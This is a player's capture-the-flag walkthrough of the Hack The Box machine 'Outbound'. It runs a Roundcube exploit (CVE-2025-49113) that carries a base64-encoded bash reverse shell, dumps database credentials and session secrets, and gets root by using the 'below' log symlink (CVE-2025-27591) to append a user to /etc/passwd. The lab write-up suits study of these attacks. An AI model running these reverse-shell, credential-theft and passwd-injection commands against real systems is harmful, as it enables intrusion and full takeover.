
// These are provided to us 
      Credentials :
       tyler / LhKL1o9Nm3X2

[ Nmap ]
nmap -p- -A --min-rate=1000 -o nmap0.txt 10.10.11.77
Nmap scan report for 10.10.11.77
Host is up (0.096s latency).
Not shown: 65533 closed tcp ports (reset)

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)

80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://mail.outbound.htb/
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 199/tcp)
HOP RTT      ADDRESS
1   94.80 ms 10.10.14.1
2   96.09 ms 10.10.11.77
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Oct 21 06:13:23 2025 -- 1 IP address (1 host up) scanned in 92.17 seconds
__________________________________________________________________________________________________________________________________________
# after that we ran nuclei and discovered a CVE

┌──(kali㉿kali)-[~/HAckthebox/Outbound]
└─$ nuclei -u http://mail.outbound.htb/                       
    < redacted >
__________________________________________________________________________________________________________________________________________
# so we use a script to abuse this vuln that can be found here:
https://github.com/hakaioffsec/CVE-2025-49113-exploit

[ Using the script...]
┌──(kali㉿kali)-[~/HAckthebox/Outbound/CVE-2025-49113-exploit]
└─$ php CVE-2025-49113.php http://mail.outbound.htb/ tyler  LhKL1o9Nm3X2 'printf KGJhc2ggPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTU2LzQ0NDQgMD4mMSkgJg== | base64 -d | bash'

[+] Starting exploit (CVE-2025-49113)...
[*] Checking Roundcube version...
[*] Detected Roundcube version: 10610
[+] Target is vulnerable!
[+] Login successful!
[*] Exploiting...
[+] Gadget uploaded successfully!

# that KGJhc2ggPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTU2LzQ0NDQgMD4mMSkgJg== is based 64 encoded of bash (reverse) shell
__________________________________________________________________________________________________________________________________________
[ Got a shell...]
┌──(kali㉿kali)-[~/HAckthebox/Outbound/CVE-2025-49113-exploit]
└─$ pwncat -l 4444
ls
bin
bin.usr-is-merged
boot
dev
etc
home 
< redacted >
____________________________________________________________________
# rough...
cd root
bash: line 2: cd: root: Permission denied
cd home
ls
jacob
mel
tyler
cd tyler
bash: line 5: cd: tyler: Permission denied
cd jacob
bash: line 6: cd: jacob: Permission denied
cd mel
bash: line 7: cd: mel: Permission denied
____________________________________________________________________
 # but we have tyler's password
su tyler
Password: LhKL1o9Nm3X2
id
uid=1000(tyler) gid=1000(tyler) groups=1000(tyler)
____________________________________________________________________
# debugging... 
ls / -al
total 84
drwxr-xr-x   1 root root 4096 Jul  9 12:41 .
drwxr-xr-x   1 root root 4096 Jul  9 12:41 ..
-rwxr-xr-x   1 root root    0 Jun  8 12:26 .dockerenv
lrwxrwxrwx   1 root root    7 Apr 22  2024 bin -> usr/bin
drwxr-xr-x   2 root root 4096 Mar 31  2024 bin.usr-is-merged
drwxr-xr-x   2 root root 4096 Apr 22  2024 boot
drwxr-xr-x   5 root root  340 Oct 20 19:33 dev
drwxr-xr-x   1 root root 4096 Jul  9 12:41 etc
drwxr-xr-x   1 root root 4096 Jun  8 12:05 home
lrwxrwxrwx   1 root root    7 Apr 22  2024 lib -> usr/lib
drwxr-xr-x   2 root root 4096 Nov 14  2024 lib.usr-is-merged
lrwxrwxrwx   1 root root    9 Apr 22  2024 lib64 -> usr/lib64
drwxr-xr-x   2 root root 4096 May 29 02:14 media
drwxr-xr-x   2 root root 4096 May 29 02:14 mnt
drwxr-xr-x   2 root root 4096 May 29 02:14 opt
dr-xr-xr-x 325 root root    0 Oct 20 19:33 proc
drwx------   1 root root 4096 Jun  8 15:39 root
drwxr-xr-x   1 root root 4096 Jun  6 18:55 run
lrwxrwxrwx   1 root root    8 Apr 22  2024 sbin -> usr/sbin
drwxr-xr-x   2 root root 4096 Mar 31  2024 sbin.usr-is-merged
drwxr-xr-x   2 root root 4096 May 29 02:14 srv
dr-xr-xr-x  13 root root    0 Oct 21 01:41 sys
drwxrwxrwt   1 root root 4096 Oct 21 10:19 tmp
drwxr-xr-x  12 root root 4096 May 29 02:14 usr
drwxr-xr-x   1 root root 4096 Jun  6 18:55 var
____________________________________________________________________
ls -al
total 32
drwxr-xr-x 1 root  root  4096 Jun  8 12:05 .
drwxr-xr-x 1 root  root  4096 Jul  9 12:41 ..
drwxr-x--- 1 jacob jacob 4096 Jun  7 13:55 jacob
drwxr-x--- 1 mel   mel   4096 Jun  8 12:06 mel
drwxr-x--- 1 tyler tyler 4096 Jun  8 13:28 tyler
____________________________________________________________________
d /var/www/html/roundcube/config
ls
config.inc.php
config.inc.php.sample
defaults.inc.php
mimetypes.php
____________________________________________________________________
cat config.inc.php
[ Shows some credentials  ]
____________________________________________________________________

#Quering SQL 
 mysql -u roundcube -pRCDBPass2025 -h localhost roundcube -e 'use roundcube;select * from users;' -E
[ Results are credentials ]
________________________________________________________________________________________________________________________________________
#Further
 mysql -u roundcube -pRCDBPass2025 -h localhost roundcube -e 'use roundcube;select * from session;' -E
[ Results are credentials ]

# the latest result shows the base64 value
________________________________________________________________________________________________________________________________________
[ I had no idea what to do so my friend told me ]
# In the earlier config.inc.php we found a des_key, and in the session we also extracted an auth_secret.
# After gathering information, it was discovered Triple DES was used.

[ So what do we do?? ]
# chatgpt
        # You have two needed pieces: a key (des_key) from config and an auth_secret value stored in session.
        # The auth_secret value is stored/base64-encoded. Decode it from base64 to raw bytes.
        # Interpret the raw bytes as: the first 8 bytes = IV (initialization vector), the rest = ciphertext. (This is typical for 3DES in CBC mode when the IV is prepended.)
        # Use Triple DES (3DES / DES-EDE) in CBC mode with the discovered key and that IV to decrypt the ciphertext.
[ Then we switch user to jacob where we find his password in a mail...,  the mail can be found in an INBOX directroy called jacob ]
________________________________________________________________________________________________________________________________________
#switching user
su jacob
Password: 595mO8DmwGeD
whoami
jacob

cat jacob
[ Results are found in jcob_mail.txt and there we find ssh password ]
____________________________________________________________________
# SSH

┌──(kali㉿kali)-[~/HAckthebox/Outbound/CVE-2025-49113-exploit]
└─$ ssh jacob@outbound.htb
jacob@outbound:~$ ls
a.py  exp.py  payload  snapshot_01761015049_01761015049.ZPwLAL  snapshot_01761015294_01761015294.VgwWg5  snapshot_01761027160_01761027160.gdzQu7
a.sh  exp.sh  poc.sh   snapshot_01761015292_01761015292.TvDrry  snapshot_01761026333_01761026333.DeKQaV  user.txt
________________________________________________________________________________________________________________________________________
# Privilege escalation
sudo -l
Matching Defaults entries for jacob on outbound:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User jacob may run the following commands on outbound:
    (ALL : ALL) NOPASSWD: /usr/bin/below *, !/usr/bin/below --config*, !/usr/bin/below --debug*, !/usr/bin/below -d*
________________________________________________________________________________________________________________________________________
[After searching, the actual method is: CVE-2025-27591 ]

we use : https://github.com/BridgerAlderson/CVE-2025-27591-PoC

[ After cloning the repo in our own system... ]
________________________________________________________________________________________________________________________________________
[ From our machine...]
 - cd CVE-2025-27591-PoC
 - python3 -m http.server 80
____________________________________________________________________
[ From vulnerable system a.k.a htb box where we're sshed or shell ]

1- wget http://ip/exploit.py
2-python exploit.py
____________________________________________________________________
# This makes us root 

jacob@outbound:~$ ls
error_root.log  exploit.py  exploit.py.1  payload  root2  user.txt
jacob@outbound:~$ python3 exploit.py
[*] Checking for CVE-2025-27591 vulnerability...
[+] /var/log/below is world-writable.
[!] /var/log/below/error_root.log is a regular file. Removing it...
[+] Symlink created: /var/log/below/error_root.log -> /etc/passwd
[+] Target is vulnerable.
[*] Starting exploitation...
[+] Wrote malicious passwd line to /tmp/attacker
[+] Symlink set: /var/log/below/error_root.log -> /etc/passwd
[*] Executing 'below record' as root to trigger logging...
Oct 24 14:45:42.598 DEBG Starting up!
Oct 24 14:45:42.598 ERRO
----------------- Detected unclean exit ---------------------
Error Message: Failed to acquire file lock on index file: /var/log/below/store/index_01761264000: EAGAIN: Try again
-------------------------------------------------------------
[+] 'below record' executed.
[*] Appending payload into /etc/passwd via symlink...
[+] Payload appended successfully.
[*] Attempting to switch to root shell via 'su attacker'...
root@outbound:/home/jacob# id
uid=0(root) gid=0(root) groups=0(root)

root@outbound:/home/jacob# cd /root
root@outbound:~# ls
root.txt
root@outbound:~#

[ Lesson = Github exploits Priv Very Nicely ]
________________________________________________________________________________________________________________________________________
